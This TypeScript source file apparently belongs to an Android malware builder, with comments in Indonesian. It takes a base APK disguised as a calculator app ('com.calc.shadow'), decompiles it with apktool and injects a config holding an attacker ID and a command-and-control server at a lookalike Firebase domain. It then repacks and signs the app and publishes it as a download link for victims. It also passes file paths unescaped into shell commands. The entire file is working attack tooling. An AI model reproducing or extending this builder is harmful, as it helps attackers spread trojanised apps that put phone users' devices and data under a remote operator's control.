import { exec } from "child_process";
import fs from "fs";
import path from "path";
import { v4 as uuidv4 } from "uuid";

interface TemplateConfig {
  id: string;
  name: string;       // e.g., "Kalkulator Pintar"
  packageName: string;
  icon: string;
  apkPath: string;    // path ke base APK yang belum diinject
}

// Gunakan hardcoded templates (bisa disimpan di DB)
const templates: TemplateConfig[] = [
  {
    id: "calc",
    name: "Kalkulator",
    packageName: "com.calc.shadow",
    icon: "/icons/calc.png",
    apkPath: path.join(process.cwd(), "templates", "calculator", "base.apk"),
  },
  // tambah template lain...
];

export async function buildApkWithAttackerId(
  templateId: string,
  attackerId: string
): Promise<{ downloadUrl: string; apkFileName: string }> {
  const template = templates.find(t => t.id === templateId);
  if (!template) throw new Error("Template tidak ditemukan");

  // Step 1: Salin base APK ke temporary folder
  const tmpDir = path.join(process.cwd(), "tmp", uuidv4());
  fs.mkdirSync(tmpDir, { recursive: true });
  const apkTemp = path.join(tmpDir, "app.apk");
  fs.copyFileSync(template.apkPath, apkTemp);

  // Step 2: Decompile APK (apktool)
  await execCommand(`apktool d ${apkTemp} -o ${tmpDir}/decompiled`);

  // Step 3: Inject attacker ID ke AndroidManifest atau file config
  // Baca file config.json atau resources yang akan di-load APK
  const configPath = path.join(tmpDir, "decompiled", "assets", "c2_config.json");
  const config = { attacker_id: attackerId, c2_server: "https://api-firebase-lo.com" };
  fs.writeFileSync(configPath, JSON.stringify(config));

  // Step 4: Build ulang APK
  await execCommand(`apktool b ${tmpDir}/decompiled -o ${tmpDir}/repacked.apk`);

  // Step 5: Sign APK (gunakan keystore testing)
  await execCommand(
    `jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore nemesis.keystore -storepass password ${tmpDir}/repacked.apk alias_name`
  );

  // Step 6: Simpan ke public/uploads dan return URL
  const finalName = `${attackerId}_${templateId}_${Date.now()}.apk`;
  const finalPath = path.join(process.cwd(), "public", "apks", finalName);
  fs.copyFileSync(path.join(tmpDir, "repacked.apk"), finalPath);
  // Cleanup tmp
  fs.rmSync(tmpDir, { recursive: true, force: true });

  const downloadUrl = `/apks/${finalName}`;
  return { downloadUrl, apkFileName: finalName };
}

function execCommand(cmd: string): Promise<void> {
  return new Promise((resolve, reject) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) reject(error);
      else resolve();
    });
  });
}
